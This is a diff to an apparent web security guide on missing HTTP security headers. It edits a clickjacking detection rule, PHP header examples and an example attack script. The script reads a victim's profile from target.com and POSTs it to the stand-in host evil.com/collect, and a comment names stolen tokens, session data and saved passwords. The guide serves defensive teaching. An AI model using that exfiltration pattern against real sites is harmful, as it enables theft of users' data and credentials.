@@ -472,7 +472,7 @@ fetch('https://target.com/api/user/profile', {
 })
 .then(r => r.json())
 .then(data => {
-    // Steal victim's personal information, tokens, etc.
+    // Steal victim's personal information, tokens, session data, saved passwords
     fetch('https://evil.com/collect', {
         method: 'POST',
         body: JSON.stringify(data)
@@ -568,7 +568,7 @@ header("Content-Security-Policy: frame-ancestors 'self' https://trusted.com");
 **Detection Rule:**
 - [x] No `X-Frame-Options` in response headers
 - [x] No `Content-Security-Policy` in response headers, or CSP lacks `frame-ancestors`
-- [x] Page contains sensitive operations (form submissions, password changes, transfers, etc.)
+- [x] Page contains sensitive operations (form submissions, password changes, transfers, account deletion, email changes)
 - If all conditions above are met → flag Clickjacking risk
 
 ### 2. Missing Content-Security-Policy → XSS Risk Elevated
@@ -672,7 +672,7 @@ header('Referrer-Policy: strict-origin-when-cross-origin');
 
 **Permissions-Policy (formerly Feature-Policy):**
 ```php
-// Restrict browser features (camera, microphone, geolocation, etc.)
+// Restrict browser features (camera, microphone, geolocation, payment, autoplay, fullscreen)
 header('Permissions-Policy: camera=(), microphone=(), geolocation=()');
 ```
 
